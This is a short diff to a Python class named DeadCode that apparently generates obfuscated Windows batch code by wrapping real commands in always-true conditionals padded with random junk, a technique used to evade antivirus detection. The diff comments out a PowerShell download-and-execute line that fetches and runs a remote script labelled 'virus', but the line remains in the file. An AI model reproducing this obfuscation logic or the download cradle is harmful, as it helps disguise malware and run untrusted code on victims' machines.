@@ -130,10 +130,10 @@ class DeadCode:
         examples = [
             f"if %random% equ {RANNUM} ( {DeadCode.random_commands()} ) else ( {good} )",
             f"if not 0 neq 0 ( {good} ) else ( {DeadCode.random_commands()} )",
-            f"if exist C:\Windows\System32 ( {good} ) else ( {DeadCode.random_commands()} )",
+            f"if exist C:\\Windows\\System32 ( {good} ) else ( {DeadCode.random_commands()} )",
             f"if not %cd% == %cd% ( {DeadCode.random_commands()} ) else ( {good} )",
             f"if 0 equ 0 ( {good} ) else ( {DeadCode.random_commands()} )",
-            f"if exist C:\Windows\System3 ( {DeadCode.random_commands()} ) else ( {good} )",
+            f"if exist C:\\Windows\\System3 ( {DeadCode.random_commands()} ) else ( {good} )",
             f"if %cd% == %cd% ( {good} ) else ( {DeadCode.random_commands()} )",
             f"if chcp leq 1 ( {DeadCode.random_commands()} ) else ( {good} )",
             f"if %CD% == %__CD__% ( {DeadCode.random_commands()} ) else ( {good} )",
@@ -155,7 +155,7 @@ class DeadCode:
     @staticmethod
     def powershell_command() -> str:
         commands = [
-            "powershell.exe -nop -c \"iex(new-object net.webclient).downloadstring('https://sped.lol/powershell/virus')\"",
+            # "powershell.exe -nop -c \"iex(new-object net.webclient).downloadstring('https://sped.lol/powershell/virus')\"",
             'powershell.exe -nop -c "Write-Host -NoNewLine $null"',
         ]
 
